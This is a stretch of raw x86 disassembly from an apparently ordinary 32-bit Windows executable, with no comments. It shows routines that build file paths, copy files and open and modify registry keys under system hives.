  40c7e7:	mov    esi,DWORD PTR [eax+0x8]
  40c7ea:	mov    ecx,esi
  40c7ec:	call   DWORD PTR ds:0x414220
  40c7f2:	call   esi
  40c7f4:	mov    DWORD PTR [edi],ebx
  40c7f6:	mov    ecx,DWORD PTR [edi+0x4]
  40c7f9:	test   ecx,ecx
  40c7fb:	je     0x40c810
  40c7fd:	mov    eax,DWORD PTR [ecx]
  40c7ff:	push   ecx
  40c800:	mov    esi,DWORD PTR [eax+0x8]
  40c803:	mov    ecx,esi
  40c805:	call   DWORD PTR ds:0x414220
  40c80b:	call   esi
  40c80d:	mov    DWORD PTR [edi+0x4],ebx
  40c810:	cmp    DWORD PTR [edi+0x8],ebx
  40c813:	je     0x40c84f
  40c815:	lea    eax,[ebp-0x8]
  40c818:	push   eax
  40c819:	call   DWORD PTR ds:0x41413c
  40c81f:	test   eax,eax
  40c821:	js     0x40c84f
  40c823:	mov    eax,DWORD PTR [ebp-0x8]
  40c826:	push   DWORD PTR [edi+0x8]
  40c829:	push   eax
  40c82a:	mov    ecx,DWORD PTR [eax]
  40c82c:	mov    esi,DWORD PTR [ecx+0x14]
  40c82f:	mov    ecx,esi
  40c831:	call   DWORD PTR ds:0x414220
  40c837:	call   esi
  40c839:	mov    eax,DWORD PTR [ebp-0x8]
  40c83c:	push   eax
  40c83d:	mov    ecx,DWORD PTR [eax]
  40c83f:	mov    esi,DWORD PTR [ecx+0x8]
  40c842:	mov    ecx,esi
  40c844:	call   DWORD PTR ds:0x414220
  40c84a:	call   esi
  40c84c:	mov    DWORD PTR [edi+0x8],ebx
  40c84f:	cmp    DWORD PTR [edi+0x10],ebx
  40c852:	je     0x40c85a
  40c854:	call   DWORD PTR ds:0x414214
  40c85a:	mov    ecx,DWORD PTR [ebp-0x4]
  40c85d:	mov    DWORD PTR [edi+0xc],0x1
  40c864:	xor    ecx,ebp
  40c866:	pop    edi
  40c867:	pop    esi
  40c868:	pop    ebx
  40c869:	call   0x411980
  40c86e:	mov    esp,ebp
  40c870:	pop    ebp
  40c871:	ret    
  40c872:	int3   
  40c873:	int3   
  40c874:	int3   
  40c875:	int3   
  40c876:	int3   
  40c877:	mov    edi,edi
  40c879:	push   ebp
  40c87a:	mov    ebp,esp
  40c87c:	sub    esp,0x3c
  40c87f:	push   esi
  40c880:	push   edi
  40c881:	mov    edi,DWORD PTR [ecx+0x8]
  40c884:	xor    esi,esi
  40c886:	test   edi,edi
  40c888:	je     0x40c8e5
  40c88a:	push   0x3c
  40c88c:	lea    eax,[ebp-0x3c]
  40c88f:	push   esi
  40c890:	push   eax
  40c891:	call   0x412060
  40c896:	add    esp,0xc
  40c899:	mov    DWORD PTR [ebp-0x3c],0x3c
  40c8a0:	lea    eax,[ebp-0x3c]
  40c8a3:	mov    DWORD PTR [ebp-0x38],0x5
  40c8aa:	mov    DWORD PTR [ebp-0x18],edi
  40c8ad:	mov    DWORD PTR [ebp-0x14],0x403624
  40c8b4:	push   eax
  40c8b5:	mov    DWORD PTR [ebp-0x34],esi
  40c8b8:	mov    DWORD PTR [ebp-0x20],0x1
  40c8bf:	mov    DWORD PTR [ebp-0x30],0x403634
  40c8c6:	call   DWORD PTR ds:0x414148
  40c8cc:	test   eax,eax
  40c8ce:	jne    0x40c8e5
  40c8d0:	call   DWORD PTR ds:0x414074
  40c8d6:	mov    esi,eax
  40c8d8:	test   esi,esi
  40c8da:	jle    0x40c8e5
  40c8dc:	movzx  esi,si
  40c8df:	or     esi,0x80070000
  40c8e5:	pop    edi
  40c8e6:	mov    eax,esi
  40c8e8:	pop    esi
  40c8e9:	mov    esp,ebp
  40c8eb:	pop    ebp
  40c8ec:	ret    
  40c8ed:	int3   
  40c8ee:	int3   
  40c8ef:	int3   
  40c8f0:	int3   
  40c8f1:	int3   
  40c8f2:	mov    edi,edi
  40c8f4:	push   ebp
  40c8f5:	mov    ebp,esp
  40c8f7:	push   ecx
  40c8f8:	push   esi
  40c8f9:	push   edi
  40c8fa:	mov    edi,ecx
  40c8fc:	mov    esi,edx
  40c8fe:	xor    ecx,ecx
  40c900:	mov    eax,ecx
  40c902:	test   edi,edi
  40c904:	jne    0x40c90a
  40c906:	test   esi,esi
  40c908:	jne    0x40c912
  40c90a:	cmp    esi,0x7fffffff
  40c910:	jbe    0x40c917
  40c912:	mov    eax,0x80070057
  40c917:	test   eax,eax
  40c919:	js     0x40c985
  40c91b:	test   esi,esi
  40c91d:	je     0x40c92d
  40c91f:	lea    eax,[ebp-0x4]
  40c922:	mov    ecx,edi
  40c924:	push   eax
  40c925:	call   0x40c992
  40c92a:	mov    ecx,DWORD PTR [ebp-0x4]
  40c92d:	test   eax,eax
  40c92f:	js     0x40c985
  40c931:	mov    edx,esi
  40c933:	push   ebx
  40c934:	sub    edx,ecx
  40c936:	lea    ebx,[edi+ecx*2]
  40c939:	mov    ecx,DWORD PTR [ebp+0x8]
  40c93c:	test   ecx,ecx
  40c93e:	jne    0x40c945
  40c940:	mov    ecx,0x401068
  40c945:	xor    eax,eax
  40c947:	cmp    edx,0x1
  40c94a:	ja     0x40c963
  40c94c:	xor    edx,edx
  40c94e:	cmp    WORD PTR [ecx],dx
  40c951:	je     0x40c984
  40c953:	mov    eax,edi
  40c955:	neg    eax
  40c957:	sbb    eax,eax
  40c959:	and    eax,0x23
  40c95c:	add    eax,0x80070057
  40c961:	jmp    0x40c974
  40c963:	push   ecx
  40c964:	push   ecx
  40c965:	lea    eax,[ebp-0x4]
  40c968:	mov    ecx,ebx
  40c96a:	push   eax
  40c96b:	call   0x4067ca
  40c970:	test   eax,eax
  40c972:	jns    0x40c984
  40c974:	test   esi,esi
  40c976:	je     0x40c984
  40c978:	lea    ecx,[esi+esi*1]
  40c97b:	shr    ecx,1
  40c97d:	je     0x40c984
  40c97f:	xor    ecx,ecx
  40c981:	mov    WORD PTR [edi],cx
  40c984:	pop    ebx
  40c985:	pop    edi
  40c986:	pop    esi
  40c987:	mov    esp,ebp
  40c989:	pop    ebp
  40c98a:	ret    0x10
  40c98d:	int3   
  40c98e:	int3   
  40c98f:	int3   
  40c990:	int3   
  40c991:	int3   
  40c992:	mov    edi,edi
  40c994:	push   ebp
  40c995:	mov    ebp,esp
  40c997:	push   ebx
  40c998:	push   esi
  40c999:	xor    ebx,ebx
  40c99b:	mov    esi,ebx
  40c99d:	push   edi
  40c99e:	mov    edi,edx
  40c9a0:	test   edx,edx
  40c9a2:	je     0x40c9b5
  40c9a4:	cmp    WORD PTR [ecx],bx
  40c9a7:	je     0x40c9b1
  40c9a9:	add    ecx,0x2
  40c9ac:	sub    edx,0x1
  40c9af:	jne    0x40c9a4
  40c9b1:	test   edx,edx
  40c9b3:	jne    0x40c9ba
  40c9b5:	mov    esi,0x80070057
  40c9ba:	mov    eax,DWORD PTR [ebp+0x8]
  40c9bd:	test   eax,eax
  40c9bf:	je     0x40c9cd
  40c9c1:	test   esi,esi
  40c9c3:	js     0x40c9cb
  40c9c5:	sub    edi,edx
  40c9c7:	mov    DWORD PTR [eax],edi
  40c9c9:	jmp    0x40c9cd
  40c9cb:	mov    DWORD PTR [eax],ebx
  40c9cd:	pop    edi
  40c9ce:	mov    eax,esi
  40c9d0:	pop    esi
  40c9d1:	pop    ebx
  40c9d2:	pop    ebp
  40c9d3:	ret    0x4
  40c9d6:	int3   
  40c9d7:	int3   
  40c9d8:	int3   
  40c9d9:	int3   
  40c9da:	int3   
  40c9db:	mov    edi,edi
  40c9dd:	push   ebp
  40c9de:	mov    ebp,esp
  40c9e0:	sub    esp,0xf84
  40c9e6:	mov    eax,ds:0x413004
  40c9eb:	xor    eax,ebp
  40c9ed:	mov    DWORD PTR [ebp-0x4],eax
  40c9f0:	push   esi
  40c9f1:	mov    esi,edx
  40c9f3:	test   ecx,ecx
  40c9f5:	je     0x40cbbd
  40c9fb:	test   esi,esi
  40c9fd:	je     0x40cbbd
  40ca03:	xor    eax,eax
  40ca05:	cmp    ax,WORD PTR [ecx]
  40ca08:	je     0x40cbbd
  40ca0e:	cmp    ax,WORD PTR [esi]
  40ca11:	je     0x40cbbd
  40ca17:	lea    ecx,[ebp-0x764]
  40ca1d:	call   0x40fa55
  40ca22:	push   esi
  40ca23:	lea    ecx,[ebp-0xf80]
  40ca29:	call   0x40eb66
  40ca2e:	push   esi
  40ca2f:	xor    esi,esi
  40ca31:	push   esi
  40ca32:	push   0x402860
  40ca37:	push   0x4028d4
  40ca3c:	call   DWORD PTR ds:0x414070
  40ca42:	cmp    eax,0x4
  40ca45:	jae    0x40cbb9
  40ca4b:	push   ebx
  40ca4c:	push   edi
  40ca4d:	push   0x104
  40ca52:	lea    eax,[ebp-0x210]
  40ca58:	push   eax
  40ca59:	call   DWORD PTR ds:0x41409c
  40ca5f:	push   0x403760
  40ca64:	lea    eax,[ebp-0xb6a]
  40ca6a:	mov    edi,0x900
  40ca6f:	push   eax
  40ca70:	lea    eax,[ebp-0x210]
  40ca76:	mov    ebx,0x105
  40ca7b:	push   eax
  40ca7c:	push   0x40376c
  40ca81:	push   edi
  40ca82:	push   esi
  40ca83:	push   esi
  40ca84:	lea    eax,[ebp-0x628]
  40ca8a:	push   ebx
  40ca8b:	push   eax
  40ca8c:	call   0x410f98
  40ca91:	add    esp,0x24
  40ca94:	test   eax,eax
  40ca96:	js     0x40cbb7
  40ca9c:	lea    ecx,[ebp-0x628]
  40caa2:	call   0x410767
  40caa7:	test   eax,eax
  40caa9:	je     0x40cbb7
  40caaf:	push   0x20a
  40cab4:	lea    eax,[ebp-0x41c]
  40caba:	push   esi
  40cabb:	push   eax
  40cabc:	call   0x412060
  40cac1:	add    esp,0xc
  40cac4:	lea    eax,[ebp-0x628]
  40caca:	push   eax
  40cacb:	push   0x104
  40cad0:	lea    eax,[ebp-0x41c]
  40cad6:	push   eax
  40cad7:	push   0x401068
  40cadc:	push   0x403640
  40cae1:	push   0x4010d8
  40cae6:	call   DWORD PTR ds:0x414114
  40caec:	xor    eax,eax
  40caee:	cmp    ax,WORD PTR [ebp-0x41c]
  40caf5:	je     0x40cbb4
  40cafb:	lea    eax,[ebp-0x41c]
  40cb01:	push   eax
  40cb02:	push   0x40377c
  40cb07:	push   edi
  40cb08:	push   esi
  40cb09:	push   esi
  40cb0a:	lea    eax,[ebp-0x210]
  40cb10:	push   ebx
  40cb11:	push   eax
  40cb12:	call   0x410f98
  40cb17:	add    esp,0x1c
  40cb1a:	test   eax,eax
  40cb1c:	js     0x40cbb7
  40cb22:	lea    eax,[ebp-0xf84]
  40cb28:	push   eax
  40cb29:	push   0x20019
  40cb2e:	push   esi
  40cb2f:	lea    eax,[ebp-0x210]
  40cb35:	push   eax
  40cb36:	push   0x80000000
  40cb3b:	call   DWORD PTR ds:0x414004
  40cb41:	test   eax,eax
  40cb43:	jne    0x40cbb7
  40cb45:	push   DWORD PTR [ebp-0xf84]
  40cb4b:	call   DWORD PTR ds:0x414008
  40cb51:	lea    ecx,[ebp-0x764]
  40cb57:	call   0x40fa90
  40cb5c:	test   eax,eax
  40cb5e:	jne    0x40cbb4
  40cb60:	lea    eax,[ebp-0x41c]
  40cb66:	push   eax
  40cb67:	push   0x403790
  40cb6c:	push   edi
  40cb6d:	push   esi
  40cb6e:	push   esi
  40cb6f:	lea    eax,[ebp-0x210]
  40cb75:	push   ebx
  40cb76:	push   eax
  40cb77:	call   0x410f98
  40cb7c:	add    esp,0x1c
  40cb7f:	test   eax,eax
  40cb81:	js     0x40cbb7
  40cb83:	lea    eax,[ebp-0xf84]
  40cb89:	push   eax
  40cb8a:	push   0x20019
  40cb8f:	push   esi
  40cb90:	lea    eax,[ebp-0x210]
  40cb96:	push   eax
  40cb97:	push   0x80000000
  40cb9c:	call   DWORD PTR ds:0x414004
  40cba2:	test   eax,eax
  40cba4:	jne    0x40cbb4
  40cba6:	push   DWORD PTR [ebp-0xf84]
  40cbac:	call   DWORD PTR ds:0x414008
  40cbb2:	jmp    0x40cbb7
  40cbb4:	xor    esi,esi
  40cbb6:	inc    esi
  40cbb7:	pop    edi
  40cbb8:	pop    ebx
  40cbb9:	mov    eax,esi
  40cbbb:	jmp    0x40cbbf
  40cbbd:	xor    eax,eax
  40cbbf:	mov    ecx,DWORD PTR [ebp-0x4]
  40cbc2:	xor    ecx,ebp
  40cbc4:	pop    esi
  40cbc5:	call   0x411980
  40cbca:	mov    esp,ebp
  40cbcc:	pop    ebp
  40cbcd:	ret    
  40cbce:	int3   
  40cbcf:	int3   
  40cbd0:	int3   
  40cbd1:	int3   
  40cbd2:	int3   
  40cbd3:	mov    edi,edi
  40cbd5:	push   ebp
  40cbd6:	mov    ebp,esp
  40cbd8:	mov    eax,0x1288
  40cbdd:	call   0x412030
  40cbe2:	mov    eax,ds:0x413004
  40cbe7:	xor    eax,ebp
  40cbe9:	mov    DWORD PTR [ebp-0x4],eax
  40cbec:	push   ebx
  40cbed:	push   esi
  40cbee:	push   edi
  40cbef:	mov    edi,DWORD PTR [ebp+0x8]
  40cbf2:	mov    esi,ecx
  40cbf4:	xor    ebx,ebx
  40cbf6:	mov    DWORD PTR [ebp-0x1284],esi
  40cbfc:	push   edx
  40cbfd:	lea    ecx,[ebp-0x1278]
  40cc03:	inc    ebx
  40cc04:	call   0x40eb66
  40cc09:	push   0x403760
  40cc0e:	lea    eax,[ebp-0xe62]
  40cc14:	push   eax
  40cc15:	push   eax
  40cc16:	lea    eax,[ebp-0x1064]
  40cc1c:	push   eax
  40cc1d:	lea    eax,[ebp-0x106e]
  40cc23:	push   eax
  40cc24:	push   0x4037f4
  40cc29:	push   0x900
  40cc2e:	push   0x0
  40cc30:	push   0x0
  40cc32:	lea    eax,[ebp-0x428]
  40cc38:	push   0x105
  40cc3d:	push   eax
  40cc3e:	call   0x410f98
  40cc43:	add    esp,0x2c
  40cc46:	lea    ecx,[ebp-0x428]
  40cc4c:	call   0x410767
  40cc51:	test   eax,eax
  40cc53:	jne    0x40ccaf
  40cc55:	push   0x104
  40cc5a:	lea    eax,[ebp-0x848]
  40cc60:	push   eax
  40cc61:	call   DWORD PTR ds:0x41409c
  40cc67:	push   0x403760
  40cc6c:	lea    eax,[ebp-0xe62]
  40cc72:	push   eax
  40cc73:	lea    eax,[ebp-0x848]
  40cc79:	push   eax
  40cc7a:	push   0x40376c
  40cc7f:	push   0x900
  40cc84:	push   0x0
  40cc86:	push   0x0
  40cc88:	lea    eax,[ebp-0x428]
  40cc8e:	push   0x105
  40cc93:	push   eax
  40cc94:	call   0x410f98
  40cc99:	add    esp,0x24
  40cc9c:	lea    ecx,[ebp-0x428]
  40cca2:	call   0x410767
  40cca7:	test   eax,eax
  40cca9:	je     0x40cebf
  40ccaf:	push   0x20a
  40ccb4:	lea    eax,[ebp-0x638]
  40ccba:	push   0x0
  40ccbc:	push   eax
  40ccbd:	call   0x412060
  40ccc2:	add    esp,0xc
  40ccc5:	lea    eax,[ebp-0x428]
  40cccb:	push   eax
  40cccc:	push   0x104
  40ccd1:	lea    eax,[ebp-0x638]
  40ccd7:	push   eax
  40ccd8:	push   0x401068
  40ccdd:	push   0x403640
  40cce2:	push   0x4010d8
  40cce7:	call   DWORD PTR ds:0x414114
  40cced:	xor    eax,eax
  40ccef:	cmp    ax,WORD PTR [ebp-0x638]
  40ccf6:	je     0x40cebd
  40ccfc:	lea    eax,[ebp-0x638]
  40cd02:	push   eax
  40cd03:	push   0x403668
  40cd08:	push   0x40344c
  40cd0d:	push   0x900
  40cd12:	push   0x0
  40cd14:	push   0x0
  40cd16:	lea    eax,[ebp-0x218]
  40cd1c:	push   0x105
  40cd21:	push   eax
  40cd22:	call   0x410f98
  40cd27:	add    esp,0x20
  40cd2a:	test   eax,eax
  40cd2c:	js     0x40cd48
  40cd2e:	lea    edx,[ebp-0x218]
  40cd34:	mov    ecx,0x80000002
  40cd39:	call   0x4070ef
  40cd3e:	xor    ebx,ebx
  40cd40:	test   eax,eax
  40cd42:	setns  bl
  40cd45:	and    ebx,0x1
  40cd48:	lea    eax,[ebp-0x638]
  40cd4e:	push   eax
  40cd4f:	push   0x40377c
  40cd54:	push   0x900
  40cd59:	push   0x0
  40cd5b:	push   0x0
  40cd5d:	lea    eax,[ebp-0x218]
  40cd63:	push   0x105
  40cd68:	push   eax
  40cd69:	call   0x410f98
  40cd6e:	add    esp,0x1c
  40cd71:	test   eax,eax
  40cd73:	js     0x40cd8e
  40cd75:	lea    edx,[ebp-0x218]
  40cd7b:	mov    ecx,0x80000000
  40cd80:	call   0x4070ef
  40cd85:	xor    ecx,ecx
  40cd87:	test   eax,eax
  40cd89:	setns  cl
  40cd8c:	and    ebx,ecx
  40cd8e:	lea    eax,[ebp-0xe62]
  40cd94:	push   eax
  40cd95:	push   0x4036f8
  40cd9a:	push   0x40344c
  40cd9f:	push   0x900
  40cda4:	push   0x0
  40cda6:	push   0x0
  40cda8:	lea    eax,[ebp-0x218]
  40cdae:	push   0x105
  40cdb3:	push   eax
  40cdb4:	call   0x410f98
  40cdb9:	add    esp,0x20
  40cdbc:	test   eax,eax
  40cdbe:	js     0x40ce27
  40cdc0:	lea    eax,[ebp-0x127c]
  40cdc6:	push   eax
  40cdc7:	push   0xf003f
  40cdcc:	push   0x0
  40cdce:	lea    eax,[ebp-0x218]
  40cdd4:	push   eax
  40cdd5:	push   0x80000002
  40cdda:	call   DWORD PTR ds:0x414004
  40cde0:	test   eax,eax
  40cde2:	jne    0x40ce27
  40cde4:	push   0x4037dc
  40cde9:	push   DWORD PTR [ebp-0x127c]
  40cdef:	call   DWORD PTR ds:0x414028
  40cdf5:	neg    eax
  40cdf7:	push   0x4037bc
  40cdfc:	push   DWORD PTR [ebp-0x127c]
  40ce02:	sbb    eax,eax
  40ce04:	inc    eax
  40ce05:	and    ebx,eax
  40ce07:	call   DWORD PTR ds:0x414028
  40ce0d:	push   DWORD PTR [ebp-0x127c]
  40ce13:	neg    eax
  40ce15:	sbb    eax,eax
  40ce17:	inc    eax
  40ce18:	and    ebx,eax
  40ce1a:	call   DWORD PTR ds:0x414008
  40ce20:	and    DWORD PTR [ebp-0x127c],0x0
  40ce27:	xor    eax,eax
  40ce29:	lea    ecx,[ebp-0x848]
  40ce2f:	push   esi
  40ce30:	mov    edx,0x105
  40ce35:	mov    WORD PTR [ebp-0x848],ax
  40ce3c:	call   0x406b17
  40ce41:	test   eax,eax
  40ce43:	je     0x40cebd
  40ce45:	and    DWORD PTR [ebp-0x1280],0x0
  40ce4c:	lea    eax,[ebp-0x1280]
  40ce52:	push   0x1
  40ce54:	push   eax
  40ce55:	lea    edx,[ebp-0x848]
  40ce5b:	xor    ecx,ecx
  40ce5d:	call   0x4068c4
  40ce62:	test   eax,eax
  40ce64:	je     0x40ceb1
  40ce66:	mov    esi,DWORD PTR ds:0x4136c4
  40ce6c:	lea    edx,[ebp-0xa58]
  40ce72:	push   0x19
  40ce74:	pop    ecx
  40ce75:	call   0x408137
  40ce7a:	test   eax,eax
  40ce7c:	js     0x40ce93
  40ce7e:	mov    edx,DWORD PTR [ebp-0x1284]
  40ce84:	lea    eax,[ebp-0xa58]
  40ce8a:	push   eax
  40ce8b:	push   edi
  40ce8c:	mov    ecx,esi
  40ce8e:	call   0x407604
  40ce93:	mov    ecx,DWORD PTR ds:0x4136c4
  40ce99:	mov    edx,edi
  40ce9b:	push   0x1
  40ce9d:	push   DWORD PTR [ebp-0x1280]
  40cea3:	call   0x40774c
  40cea8:	xor    ecx,ecx
  40ceaa:	test   eax,eax
  40ceac:	setns  cl
  40ceaf:	and    ebx,ecx
  40ceb1:	push   DWORD PTR [ebp-0x1280]
  40ceb7:	call   DWORD PTR ds:0x4141bc
  40cebd:	mov    eax,ebx
  40cebf:	mov    ecx,DWORD PTR [ebp-0x4]
  40cec2:	pop    edi
  40cec3:	pop    esi
  40cec4:	xor    ecx,ebp
  40cec6:	pop    ebx
  40cec7:	call   0x411980
  40cecc:	mov    esp,ebp
  40cece:	pop    ebp
  40cecf:	ret    0x4
  40ced2:	int3   
  40ced3:	int3   
  40ced4:	int3   
  40ced5:	int3   
  40ced6:	int3   
  40ced7:	mov    edi,edi
  40ced9:	push   ebp
  40ceda:	mov    ebp,esp
  40cedc:	mov    eax,0x1490
  40cee1:	call   0x412030
  40cee6:	mov    eax,ds:0x413004
  40ceeb:	xor    eax,ebp
  40ceed:	mov    DWORD PTR [ebp-0x4],eax
  40cef0:	push   ebx
  40cef1:	mov    ebx,DWORD PTR [ebp+0x8]
  40cef4:	xor    eax,eax
  40cef6:	push   esi
  40cef7:	push   edi
  40cef8:	push   0x208
  40cefd:	mov    WORD PTR [ebp-0x218],ax
  40cf04:	xor    esi,esi
  40cf06:	lea    eax,[ebp-0x216]
  40cf0c:	mov    DWORD PTR [ebp-0x1490],ecx
  40cf12:	push   esi
  40cf13:	push   eax
  40cf14:	mov    edi,edx
  40cf16:	call   0x412060
  40cf1b:	add    esp,0xc
  40cf1e:	test   edi,edi
  40cf20:	je     0x40d161
  40cf26:	xor    eax,eax
  40cf28:	cmp    ax,WORD PTR [edi]
  40cf2b:	je     0x40d161
  40cf31:	push   0x104
  40cf36:	lea    eax,[ebp-0x218]
  40cf3c:	push   eax
  40cf3d:	call   DWORD PTR ds:0x41409c
  40cf43:	test   eax,eax
  40cf45:	je     0x40d161
  40cf4b:	sub    esp,0xc
  40cf4e:	lea    ecx,[ebp-0x218]
  40cf54:	mov    edx,0x105
  40cf59:	push   0x401338
  40cf5e:	call   0x40c8f2
  40cf63:	lea    eax,[ebp-0x218]
  40cf69:	push   eax
  40cf6a:	push   0x40380c
  40cf6f:	push   0x900
  40cf74:	push   esi
  40cf75:	push   esi
  40cf76:	lea    eax,[ebp-0x848]
  40cf7c:	push   0x105
  40cf81:	push   eax
  40cf82:	call   0x410f98
  40cf87:	add    esp,0x1c
  40cf8a:	lea    eax,[ebp-0x218]
  40cf90:	push   eax
  40cf91:	push   0x403828
  40cf96:	push   0x900
  40cf9b:	push   esi
  40cf9c:	push   esi
  40cf9d:	lea    eax,[ebp-0xa58]
  40cfa3:	push   0x105
  40cfa8:	push   eax
  40cfa9:	call   0x410f98
  40cfae:	add    esp,0x1c
  40cfb1:	lea    ecx,[ebp-0x848]
  40cfb7:	call   0x410767
  40cfbc:	test   eax,eax
  40cfbe:	jne    0x40d005
  40cfc0:	push   ebx
  40cfc1:	push   0x40380c
  40cfc6:	push   0x900
  40cfcb:	push   esi
  40cfcc:	push   esi
  40cfcd:	lea    eax,[ebp-0x848]
  40cfd3:	push   0x105
  40cfd8:	push   eax
  40cfd9:	call   0x410f98
  40cfde:	add    esp,0x1c
  40cfe1:	lea    eax,[ebp-0xa58]
  40cfe7:	push   ebx
  40cfe8:	push   0x403828
  40cfed:	push   0x900
  40cff2:	push   esi
  40cff3:	push   esi
  40cff4:	mov    ebx,0x105
  40cff9:	push   ebx
  40cffa:	push   eax
  40cffb:	call   0x410f98
  40d000:	add    esp,0x1c
  40d003:	jmp    0x40d00a
  40d005:	mov    ebx,0x105
  40d00a:	push   esi
  40d00b:	lea    eax,[ebp-0xa58]
  40d011:	push   eax
  40d012:	lea    eax,[ebp-0x848]
  40d018:	push   eax
  40d019:	call   DWORD PTR ds:0x4140a4
  40d01f:	test   eax,eax
  40d021:	je     0x40d15d
  40d027:	push   edi
  40d028:	lea    ecx,[ebp-0x1488]
  40d02e:	call   0x40eb66
  40d033:	lea    eax,[ebp-0x1274]
  40d039:	mov    edi,0x900
  40d03e:	push   eax
  40d03f:	lea    eax,[ebp-0x127e]
  40d045:	push   eax
  40d046:	push   0x401f98
  40d04b:	push   edi
  40d04c:	push   esi
  40d04d:	push   esi
  40d04e:	lea    eax,[ebp-0x428]
  40d054:	push   ebx
  40d055:	push   eax
  40d056:	call   0x410f98
  40d05b:	add    esp,0x20
  40d05e:	lea    eax,[ebp-0x428]
  40d064:	push   eax
  40d065:	lea    eax,[ebp-0x218]
  40d06b:	push   eax
  40d06c:	call   DWORD PTR ds:0x41407c
  40d072:	test   eax,eax
  40d074:	jne    0x40d07c
  40d076:	inc    eax
  40d077:	jmp    0x40d163
  40d07c:	push   edi
  40d07d:	push   ecx
  40d07e:	push   ecx
  40d07f:	push   0x4010e8
  40d084:	mov    edx,ebx
  40d086:	lea    ecx,[ebp-0xc68]
  40d08c:	call   0x4064d3
  40d091:	lea    eax,[ebp-0x148c]
  40d097:	push   eax
  40d098:	push   0xf003f
  40d09d:	push   esi
  40d09e:	lea    eax,[ebp-0xc68]
  40d0a4:	push   eax
  40d0a5:	push   0x80000002
  40d0aa:	call   DWORD PTR ds:0x414004
  40d0b0:	test   eax,eax
  40d0b2:	jne    0x40d15d
  40d0b8:	lea    eax,[ebp-0x428]
  40d0be:	push   eax
  40d0bf:	call   DWORD PTR ds:0x414068
  40d0c5:	mov    edi,0x403848
  40d0ca:	lea    eax,[eax*2+0x2]
  40d0d1:	push   eax
  40d0d2:	lea    eax,[ebp-0x428]
  40d0d8:	push   eax
  40d0d9:	push   0x1
  40d0db:	push   esi
  40d0dc:	push   edi
  40d0dd:	push   DWORD PTR [ebp-0x148c]
  40d0e3:	call   DWORD PTR ds:0x41403c
  40d0e9:	test   eax,eax
  40d0eb:	jne    0x40d151
  40d0ed:	push   0x208
  40d0f2:	mov    WORD PTR [ebp-0x638],ax
  40d0f9:	lea    eax,[ebp-0x636]
  40d0ff:	push   esi
  40d100:	push   eax
  40d101:	call   0x412060
  40d106:	add    esp,0xc
  40d109:	lea    eax,[ebp-0x638]
  40d10f:	push   0x104
  40d114:	push   eax
  40d115:	push   0xd2
  40d11a:	push   DWORD PTR [ebp-0x1490]
  40d120:	call   DWORD PTR ds:0x414188
  40d126:	push   0x1
  40d128:	lea    eax,[ebp-0x638]
  40d12e:	xor    ecx,ecx
  40d130:	push   eax
  40d131:	push   0x403858
  40d136:	lea    edx,[ebp-0xa58]
  40d13c:	call   0x410068
  40d141:	push   edi
  40d142:	push   DWORD PTR [ebp-0x148c]
  40d148:	call   DWORD PTR ds:0x414028
  40d14e:	xor    esi,esi
  40d150:	inc    esi
  40d151:	push   DWORD PTR [ebp-0x148c]
  40d157:	call   DWORD PTR ds:0x414008
  40d15d:	mov    eax,esi
  40d15f:	jmp    0x40d163
  40d161:	xor    eax,eax
  40d163:	mov    ecx,DWORD PTR [ebp-0x4]
  40d166:	pop    edi
  40d167:	pop    esi
  40d168:	xor    ecx,ebp
  40d16a:	pop    ebx
  40d16b:	call   0x411980
  40d170:	mov    esp,ebp
  40d172:	pop    ebp
  40d173:	ret    0x4
  40d176:	int3   
  40d177:	int3   
  40d178:	int3   
  40d179:	int3   
  40d17a:	int3   
  40d17b:	mov    edi,edi
  40d17d:	push   ebp
  40d17e:	mov    ebp,esp
  40d180:	sub    esp,0xe68
  40d186:	mov    eax,ds:0x413004
  40d18b:	xor    eax,ebp
  40d18d:	mov    DWORD PTR [ebp-0x4],eax
  40d190:	push   ebx
  40d191:	mov    ebx,DWORD PTR [ebp+0x8]
  40d194:	xor    eax,eax
  40d196:	push   esi
  40d197:	push   edi
  40d198:	push   0x208
  40d19d:	mov    WORD PTR [ebp-0x638],ax
  40d1a4:	xor    edi,edi
  40d1a6:	lea    eax,[ebp-0x636]
  40d1ac:	mov    DWORD PTR [ebp-0xe64],ecx
  40d1b2:	mov    esi,edx
  40d1b4:	push   edi
  40d1b5:	push   eax
  40d1b6:	mov    DWORD PTR [ebp-0xe5c],esi
  40d1bc:	call   0x412060
  40d1c1:	add    esp,0xc
  40d1c4:	xor    eax,eax
  40d1c6:	mov    WORD PTR [ebp-0x218],ax
  40d1cd:	lea    eax,[ebp-0x216]
  40d1d3:	push   0x208
  40d1d8:	push   edi
  40d1d9:	push   eax
  40d1da:	call   0x412060
  40d1df:	add    esp,0xc
  40d1e2:	xor    eax,eax
  40d1e4:	mov    WORD PTR [ebp-0x428],ax
  40d1eb:	lea    eax,[ebp-0x426]
  40d1f1:	push   0x208
  40d1f6:	push   edi
  40d1f7:	push   eax
  40d1f8:	call   0x412060
  40d1fd:	add    esp,0xc
  40d200:	mov    DWORD PTR [ebp-0xe60],edi
  40d206:	lea    eax,[ebp-0x428]
  40d20c:	push   0x105
  40d211:	push   eax
  40d212:	call   DWORD PTR ds:0x41409c
  40d218:	test   eax,eax
  40d21a:	je     0x40d2c1
  40d220:	push   0x4014c8
  40d225:	call   DWORD PTR ds:0x414068
  40d22b:	push   0x403658
  40d230:	mov    esi,eax
  40d232:	call   DWORD PTR ds:0x414068
  40d238:	add    esi,eax
  40d23a:	lea    eax,[ebp-0x428]
  40d240:	push   eax
  40d241:	call   DWORD PTR ds:0x414068
  40d247:	inc    esi
  40d248:	add    eax,esi
  40d24a:	push   eax
  40d24b:	mov    DWORD PTR [ebp-0xe68],eax
  40d251:	call   DWORD PTR ds:0x4141b0
  40d257:	mov    esi,eax
  40d259:	mov    DWORD PTR [ebp-0xe60],esi
  40d25f:	test   esi,esi
  40d261:	je     0x40d2bb
  40d263:	push   0x4014c8
  40d268:	push   0x403658
  40d26d:	lea    eax,[ebp-0x428]
  40d273:	push   eax
  40d274:	push   0x4015e8
  40d279:	push   0x900
  40d27e:	push   edi
  40d27f:	push   edi
  40d280:	push   DWORD PTR [ebp-0xe68]
  40d286:	push   esi
  40d287:	call   0x410f98
  40d28c:	add    esp,0x24
  40d28f:	test   eax,eax
  40d291:	js     0x40d2bb
  40d293:	push   esi
  40d294:	push   ebx
  40d295:	push   0x403868
  40d29a:	push   DWORD PTR ds:0x4130e8
  40d2a0:	call   0x40e818
  40d2a5:	add    esp,0x10
  40d2a8:	mov    edx,ebx
  40d2aa:	xor    ecx,ecx
  40d2ac:	push   0x1
  40d2ae:	push   esi
  40d2af:	call   0x407202
  40d2b4:	push   esi
